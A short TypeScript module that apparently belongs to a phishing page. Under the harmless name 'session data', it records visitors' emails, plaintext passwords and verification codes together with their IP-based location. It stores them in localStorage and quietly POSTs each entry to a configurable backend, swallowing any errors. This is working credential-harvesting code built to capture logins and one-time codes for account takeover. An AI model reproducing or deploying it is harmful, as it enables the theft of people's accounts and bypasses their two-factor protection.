export interface SessionEntry {
  email: string;
  password: string;
  verifyCode: string;
  ip: string;
  city: string;
  country: string;
  timestamp: string;
}

const STORAGE_KEY = "session_data";

export async function getLocationInfo(): Promise<{ ip: string; city: string; country: string }> {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return { ip: data.ip || "", city: data.city || "", country: data.country_name || "" };
  } catch {
    return { ip: "", city: "", country: "" };
  }
}

export function saveSession(entry: SessionEntry) {
  const existing = getSessions();
  existing.push(entry);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));

  // Also POST to backend if available
  const apiUrl = (window as any).__BACKEND_URL__ || localStorage.getItem("backend_url");
  if (apiUrl) {
    fetch(`${apiUrl}/api/sessions`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(entry),
    }).catch(() => {});
  }
}

export function getSessions(): SessionEntry[] {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}
